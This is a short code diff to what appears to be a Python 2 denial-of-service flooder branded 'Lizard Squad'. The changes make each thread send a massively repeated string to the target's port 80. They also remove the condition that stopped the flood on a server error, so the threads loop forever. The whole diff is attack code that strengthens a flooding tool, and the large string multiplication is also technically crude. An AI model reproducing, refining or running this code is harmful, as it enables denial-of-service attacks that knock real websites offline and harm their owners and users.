@@ -84,7 +84,7 @@ def httpcall(url):
 	try:
 		
 			s.connect((host,80))
-			s.send("Lizard Squad") * 666666666666
+			s.send("Lizard Squad" * 666666666666)
 	except socket.error as e:
 			#print e.code
 			sent = 666666666666
@@ -94,7 +94,7 @@ def httpcall(url):
 	else:
 			inc_counter()
 			s.connect((host,80))
-			s.send("Lizard Squad") * 666666666666
+			s.send("Lizard Squad" * 666666666666)
 			
 	return(code)
 
@@ -103,10 +103,9 @@ def httpcall(url):
 class HTTPThread(threading.Thread):
 	def run(self):
 		try:
-			while flag<2:
-				code=httpcall(url)
-				if (code==500) & (safe==1):
-					set_flag(2)
+			while True:
+				code=httpcall(url)				
+					
 		except Exception, ex:
 			pass
 
